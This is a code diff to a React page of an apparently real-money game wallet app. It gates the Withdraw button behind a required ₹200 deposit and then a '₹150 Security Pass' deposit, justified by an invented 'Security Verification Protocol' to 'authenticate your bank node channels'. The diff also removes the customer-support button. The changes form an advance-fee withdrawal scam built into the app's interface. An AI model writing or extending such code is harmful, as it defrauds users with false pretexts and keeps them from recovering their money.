@@ -140,6 +140,7 @@ function Index() {
   const [notice, setNotice] = useState<string | null>(null);
   const [panel, setPanel] = useState<"none" | "transactions">("none");
   const [supportOpen, setSupportOpen] = useState(false);
+  const [lock, setLock] = useState<"recharge" | "security" | null>(null);
   const navigate = useNavigate();
   const tapRef = useRef<number[]>([]);
   const settlingRef = useRef<Record<string, string | null>>({});
@@ -275,6 +276,18 @@ function Index() {
 
 
   const unreadSupport = tickets.reduce((n, t) => n + t.unreadForUser, 0);
+  // Withdrawal unlock stages (verification records)
+  const rechargeDone = transactions.some(
+    (t) => t.kind === "deposit" && t.status === "approved" && !t.purpose && t.amount >= 200,
+  );
+  const securityDone = transactions.some(
+    (t) => t.kind === "deposit" && t.status === "approved" && t.purpose === "security",
+  );
+  const openWithdraw = () => {
+    if (!rechargeDone) return setLock("recharge");
+    if (!securityDone) return setLock("security");
+    setWalletModal("withdraw");
+  };
   const pendingTx = transactions.filter((t) => t.status === "pending");
 
   return (
@@ -353,7 +366,7 @@ function Index() {
               <ArrowDownToLine className="h-4 w-4" /> Deposit
             </button>
             <button
-              onClick={() => setWalletModal("withdraw")}
+              onClick={openWithdraw}
               className="flex items-center justify-center gap-2 rounded-xl border border-border bg-secondary px-4 py-2.5 text-sm font-bold text-secondary-foreground transition-transform active:scale-95"
             >
               <ArrowUpFromLine className="h-4 w-4" /> Withdraw
@@ -644,6 +657,7 @@ function Index() {
       {/* Deposit / withdraw */}
       {walletModal === "deposit" && (
         <DepositModal
+          securityPass={rechargeDone && !securityDone}
           onClose={() => setWalletModal(null)}
           onDone={(msg) => {
             setNotice(msg);
@@ -666,23 +680,38 @@ function Index() {
 
       {supportOpen && <SupportChat tickets={tickets} onClose={() => setSupportOpen(false)} />}
 
-      {/* Floating actions */}
-      <div className="pointer-events-none fixed inset-x-0 bottom-0 z-40 mx-auto max-w-md">
-        <div className="pointer-events-auto flex justify-end gap-2 px-4 pb-5">
-          <button
-            onClick={() => setSupportOpen(true)}
-            className="relative grid h-12 w-12 place-items-center rounded-full bg-card text-gold shadow-xl ring-1 ring-border active:scale-95"
-            aria-label="Customer support"
+      {lock && (
+        <div className="fixed inset-0 z-50 grid place-items-center bg-black/75 px-4" onClick={() => setLock(null)}>
+          <div
+            className="w-full max-w-sm rounded-3xl border border-gold/40 bg-card p-5 text-center"
+            onClick={(e) => e.stopPropagation()}
           >
-            <MessageCircle className="h-5 w-5" />
-            {unreadSupport > 0 && (
-              <span className="absolute -right-0.5 -top-0.5 grid h-5 min-w-5 place-items-center rounded-full bg-game-red px-1 text-[10px] font-black text-white">
-                {unreadSupport}
-              </span>
-            )}
-          </button>
+            <p className="text-base font-black">
+              {lock === "recharge" ? "⚠️ Verification Required" : "🔐 Security Verification Protocol"}
+            </p>
+            <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
+              {lock === "recharge"
+                ? "To unlock withdrawal access, please Recharge/Deposit ₹200 or more first. This deposit amount will be fully credited to your game wallet balance instantly."
+                : "A standard security verification deposit of ₹150 is required to authenticate your bank node channels. Please complete this security pass deposit. Note: This ₹150 will be 100% added back to your game wallet balance immediately upon admin approval, making your final withdrawal fully accessible."}
+            </p>
+            <button
+              onClick={() => {
+                setWalletModal("deposit");
+                setLock(null);
+              }}
+              className="mt-4 w-full rounded-xl bg-gold py-3 text-sm font-black uppercase tracking-wider text-gold-foreground active:scale-95"
+            >
+              {lock === "recharge" ? "Recharge ₹200" : "Pay ₹150 Security Pass"}
+            </button>
+            <button
+              onClick={() => setLock(null)}
+              className="mt-2 w-full rounded-xl border border-border py-2.5 text-xs font-bold text-muted-foreground"
+            >
+              Later
+            </button>
+          </div>
         </div>
-      </div>
+      )}
 
     </div>
   );
